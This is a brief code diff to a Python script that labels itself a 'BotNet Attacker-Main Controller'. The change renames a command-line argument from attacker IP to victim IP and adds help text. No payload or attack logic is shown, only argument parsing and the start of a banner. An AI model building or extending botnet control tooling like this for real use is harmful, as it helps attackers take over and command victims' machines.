@@ -3,8 +3,8 @@ from colorama import Fore,init
 from colorama import Back as bg
 from multiprocessing import Process
 parser = argparse.ArgumentParser(description='BotNet Attacker-Main Controller')
-parser.add_argument('-ip','--attackerip',metavar='',help='')
-parser.add_argument('-p','--port',metavar='',help='')
+parser.add_argument('-ip','--victims_ip',metavar='',help='Enter Victims Ip Where To Listen Connection')
+parser.add_argument('-p','--port',metavar='',help='Enter What Port To Bind')
 args = parser.parse_args()
 init(autoreset=True)
 class Controller(object):
@@ -66,7 +66,7 @@ class Controller(object):
         except Exception:
             print(f'\nUsage for help: python3 {os.path.basename(__name__)} -h ')
 if __name__ == "__main__":
-    main_class = Controller(args.attackerip,args.port)
+    main_class = Controller(args.victims_ip,args.port)
     banner = Process(target=main_class.show_banner,args=('''
      _,-ddd888888bbb-._
    d88888888888888888888b     ------------------
